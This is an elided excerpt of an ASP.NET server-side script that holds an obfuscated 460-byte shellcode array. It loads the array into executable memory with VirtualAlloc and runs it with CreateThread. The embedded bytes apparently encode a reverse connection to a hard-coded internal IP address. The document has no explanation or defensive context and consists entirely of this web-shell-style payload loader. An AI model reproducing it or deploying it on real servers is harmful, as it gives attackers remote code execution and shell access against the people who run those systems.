...
<script runat="server">
    ...
    {
        byte[] o5fzdNz64B5V = new byte[460] {
...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x35,0x0a,0x08,0xfd,0xdd,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr sFpFJTPbvzn = VirtualAlloc(IntPtr.Zero,(UIntPtr)o5fzdNz64B5V.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(o5fzdNz64B5V,0,sFpFJTPbvzn,o5fzdNz64B5V.Length);
        IntPtr o0PDaCqdBA = IntPtr.Zero;
        IntPtr rE_WMF = CreateThread(IntPtr.Zero,UIntPtr.Zero,sFpFJTPbvzn,IntPtr.Zero,0,ref o0PDaCqdBA);
    }
</script>
